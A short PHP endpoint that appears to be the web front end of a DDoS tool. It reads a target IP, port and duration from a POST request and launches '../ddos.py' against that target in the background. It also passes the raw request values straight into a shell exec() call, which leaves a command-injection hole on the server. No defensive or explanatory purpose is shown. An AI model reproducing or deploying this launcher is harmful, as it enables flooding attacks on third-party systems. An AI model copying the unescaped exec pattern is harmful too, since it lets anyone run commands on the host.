<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_POST['ip'];
    $port = $_POST['port'];
    $duration = isset($_POST['duration']) ? $_POST['duration'] : 1; // Default duration is 1 minute

    // Use exec to execute the Python script with the IP address, port, and duration as parameters in the background
    exec("python3 ../ddos.py $ip $port $duration > /dev/null 2>&1 &", $output, $returnCode);

    if ($returnCode === 0) {
        // If the execution was successful, return a success message
        echo json_encode(['success' => true, 'message' => 'Script execution initiated successfully.']);
    } else {
        // If there was an error, return an error message
        echo json_encode(['success' => false, 'error' => 'Error initiating script execution.']);
    }
} else {
    // Return an error if the request method is not POST
    echo json_encode(['success' => false, 'error' => 'Invalid request method.']);
}
?>
